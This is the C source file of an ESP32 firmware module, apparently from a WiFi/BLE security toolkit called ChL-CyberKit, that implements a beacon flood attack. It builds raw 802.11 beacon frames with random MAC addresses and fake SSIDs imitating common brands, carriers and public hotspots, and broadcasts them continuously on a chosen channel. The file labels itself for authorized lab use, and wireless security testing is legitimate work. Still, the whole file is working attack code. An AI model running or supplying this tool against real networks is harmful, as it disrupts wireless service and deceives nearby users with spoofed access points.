/*
 * ChL-CyberKit v1.0 PRO — ESP32 WiFi/BLE Security Auditing Framework
 * Copyright (C) 2026  ChL (Pedro Reza) <pedrorezabala26@gmail.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
/**
 * @file beacon_flood.c
 * @brief Implementación del Beacon Flood.
 *        SOLO PARA USO EN LABORATORIO AUTORIZADO.
 *
 * @author Pedro Luis Rezabala — ChL-CyberKit v1.0 PRO
 */
#include "beacon_flood.h"

#include <string.h>
#include <stdlib.h>
#include "esp_log.h"
#include "esp_random.h"   /* esp_random() / esp_fill_random() */
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "beacon_flood";

/* ── Estado interno ─────────────────────────────────────────────────────── */
static beacon_flood_state_t g_state     = BF_IDLE;
static uint32_t             g_count     = 0;
static uint32_t             g_rate_ms   = BEACON_FLOOD_DEFAULT_RATE_MS;
static uint8_t              g_channel   = BEACON_FLOOD_DEFAULT_CHANNEL;
static TaskHandle_t         g_task      = NULL;

/* ── Palabras para SSIDs aleatorios ─────────────────────────────────────── */
static const char *WORDS[] = {
    "FreeWiFi","Airport","Hotel","Coffee","Guest","Public",
    "Office","Home","Secure","Open","4G_Hotspot","Telcel",
    "Claro","CNT","FiberHome","LinkSys","NETGEAR","Cisco",
    "Android","iPhone","iPad","DIRECT","HUAWEI","TP-LINK",
    "D-Link","Ubiquiti","MikroTik","xFinity","Spectrum","AT&T"
};
#define NWORDS ((int)(sizeof(WORDS)/sizeof(WORDS[0])))

/* ── Generar SSID aleatorio ──────────────────────────────────────────────── */
static void random_ssid(char *out, uint8_t maxlen) {
    int idx = esp_random() % (uint32_t)NWORDS;
    uint32_t n = esp_random() % 100;
    snprintf(out, maxlen, "%s_%02lu", WORDS[idx], (unsigned long)n);
}

/* ── Frame de beacon raw 802.11 (mínimo) ────────────────────────────────── */
/*
 * Estructura:
 *   [0-1]  Frame Control = 0x80 0x00 (Beacon)
 *   [2-3]  Duration = 0x00 0x00
 *   [4-9]  DA = FF:FF:FF:FF:FF:FF (broadcast)
 *   [10-15] SA = BSSID aleatorio
 *   [16-21] BSSID = SA
 *   [22-23] Seq ctrl
 *   [24-31] Timestamp = 0
 *   [32-33] Beacon interval = 100 (0x64 0x00)
 *   [34-35] Capability info = 0x01 0x04 (ESS, Short Preamble)
 *   IEs:
 *   [36]   Tag 0 (SSID)
 *   [37]   SSID len
 *   [38..] SSID bytes
 *   Tag 3 (DS Param) → channel
 */
static void build_beacon(uint8_t *frame, int *frame_len,
                          const char *ssid, uint8_t channel) {
    uint8_t rand_mac[6];
    esp_fill_random(rand_mac, 6);
    rand_mac[0] = (rand_mac[0] & 0xFE) | 0x02;  /* Unicast, Local admin */

    uint8_t ssid_len = (uint8_t)strlen(ssid);

    /* Frame Control */
    frame[0]  = 0x80; frame[1]  = 0x00;
    /* Duration */
    frame[2]  = 0x00; frame[3]  = 0x00;
    /* DA broadcast */
    memset(&frame[4], 0xFF, 6);
    /* SA = rand_mac */
    memcpy(&frame[10], rand_mac, 6);
    /* BSSID = rand_mac */
    memcpy(&frame[16], rand_mac, 6);
    /* Seq ctrl */
    frame[22] = 0x00; frame[23] = 0x00;
    /* Timestamp (8 bytes) */
    memset(&frame[24], 0, 8);
    /* Beacon interval = 100 TU = 0x0064 little-endian */
    frame[32] = 0x64; frame[33] = 0x00;
    /* Capability Info: ESS + Short Preamble */
    frame[34] = 0x01; frame[35] = 0x04;

    int pos = 36;
    /* IE 0: SSID */
    frame[pos++] = 0x00;
    frame[pos++] = ssid_len;
    memcpy(&frame[pos], ssid, ssid_len); pos += ssid_len;

    /* IE 1: Supported Rates (8 rates) */
    frame[pos++] = 0x01; frame[pos++] = 8;
    frame[pos++] = 0x82; frame[pos++] = 0x84;
    frame[pos++] = 0x8B; frame[pos++] = 0x96;
    frame[pos++] = 0x24; frame[pos++] = 0x30;
    frame[pos++] = 0x48; frame[pos++] = 0x6C;

    /* IE 3: DS Parameter Set → channel */
    frame[pos++] = 0x03; frame[pos++] = 0x01;
    frame[pos++] = channel;

    /* IE 42: ERP Info */
    frame[pos++] = 0x2A; frame[pos++] = 0x01; frame[pos++] = 0x00;

    *frame_len = pos;
}

/* ── Tarea de inyección ──────────────────────────────────────────────────── */
static void flood_task(void *arg) {
    (void)arg;
    uint8_t frame[128];
    int     frame_len = 0;
    char    ssid[32];

    ESP_LOGI(TAG, "Beacon flood iniciado — canal %d, tasa %lums",
             (int)g_channel, (unsigned long)g_rate_ms);

    /* Asegurar canal */
    esp_wifi_set_channel(g_channel, WIFI_SECOND_CHAN_NONE);

    while (g_state == BF_RUNNING) {
        random_ssid(ssid, sizeof(ssid));
        build_beacon(frame, &frame_len, ssid, g_channel);

        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, frame_len, false);
        if (err == ESP_OK) {
            g_count++;
        }
        vTaskDelay(pdMS_TO_TICKS(g_rate_ms));
    }

    ESP_LOGI(TAG, "Beacon flood detenido. Total: %lu", (unsigned long)g_count);
    vTaskDelete(NULL);
}

/* ── API ─────────────────────────────────────────────────────────────────── */
bool beacon_flood_start(uint8_t channel, uint32_t rate_ms) {
    if (g_state == BF_RUNNING) {
        ESP_LOGW(TAG, "Flood ya en curso");
        return false;
    }
    if (channel < 1 || channel > 13) channel = BEACON_FLOOD_DEFAULT_CHANNEL;
    if (rate_ms < 5) rate_ms = 5;

    g_channel = channel;
    g_rate_ms = rate_ms;
    g_count   = 0;
    g_state   = BF_RUNNING;

    BaseType_t r = xTaskCreate(flood_task, "bf_task", 4096, NULL, 5, &g_task);
    if (r != pdPASS) {
        g_state = BF_IDLE;
        ESP_LOGE(TAG, "No se pudo crear tarea flood");
        return false;
    }
    return true;
}

void beacon_flood_stop(void) {
    g_state = BF_IDLE;
    /* La tarea termina sola al comprobar g_state */
    g_task = NULL;
    ESP_LOGI(TAG, "Deteniendo flood…");
}

beacon_flood_state_t beacon_flood_get_state(void) { return g_state; }
uint32_t             beacon_flood_count(void)      { return g_count; }
